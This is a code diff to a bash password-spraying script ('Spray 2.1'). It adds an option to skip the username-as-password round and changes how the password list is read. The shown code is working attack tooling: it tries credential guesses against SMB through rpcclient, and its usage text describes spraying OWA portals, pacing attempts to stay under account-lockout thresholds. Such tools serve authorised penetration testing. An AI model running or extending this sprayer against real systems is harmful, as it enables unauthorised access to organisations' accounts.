@@ -5,8 +5,9 @@ echo -e "\nSpray 2.1 the Password Sprayer by Jacob Wilkin(Greenwolf)\n"
 if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help" ] ; then
     echo "This script will password spray a target over a period of time"
     echo "It requires password policy as input so accounts are not locked out"
-    echo "Useage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain>"
+    echo "Useage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain> <OptionalSkipUsernameUsernameSpray>"
     echo -e "Example: spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 CORPORATION\n"
+    echo -e "Example Skipping Username:Username Spray: spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 CORPORATION NOUSERUSER\n"
 
     echo "To password spray an OWA portal, a file must be created of the POST request with Username: sprayuser@domain.com, and Password: spraypassword"
     echo "Useage: spray.sh -owa <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <RequestFile>"
@@ -110,6 +111,7 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     mkdir -p logs
     set +H
     domain=$7
+    nouseruser=$8
     target=$2
     cp $3 logs/username-removed-successes.txt
     userslist="logs/username-removed-successes.txt"
@@ -120,20 +122,22 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     touch logs/spray-logs.txt
 
     #Initial spray for same username as password
-    time=$(date +%H:%M:%S)
-    echo "$time Spraying with password: Users Username"
-    for u in $(cat $userslist); do 
-    	(echo -n "[*] user $u%$u " && rpcclient -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt
-    done
-    cat logs/spray-logs.txt | grep -v "Cannot"
-    counter=$(($counter + 1))
-    if [ $counter -eq $lockout ] ; then
-    	counter=0
-    	sleep $lockoutduration
+    if [ "$nouseruser" == "" ] ; then
+        time=$(date +%H:%M:%S)
+        echo "$time Spraying with password: Users Username"
+        for u in $(cat $userslist); do 
+        	(echo -n "[*] user $u%$u " && rpcclient -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt
+        done
+        cat logs/spray-logs.txt | grep -v "Cannot"
+        counter=$(($counter + 1))
+        if [ $counter -eq $lockout ] ; then
+        	counter=0
+        	sleep $lockoutduration
+	fi
     fi
 
     #Then start on list
-    for password in $(cat $passwordlist); do
+    while read password; do
         time=$(date +%H:%M:%S)
     	echo "$time Spraying with password: $password"
     	for u in $(cat $userslist); do 
@@ -151,7 +155,7 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     		counter=0
     		sleep $lockoutduration
     	fi
-    done
+    done < $passwordlist
     exit 0
 fi
 
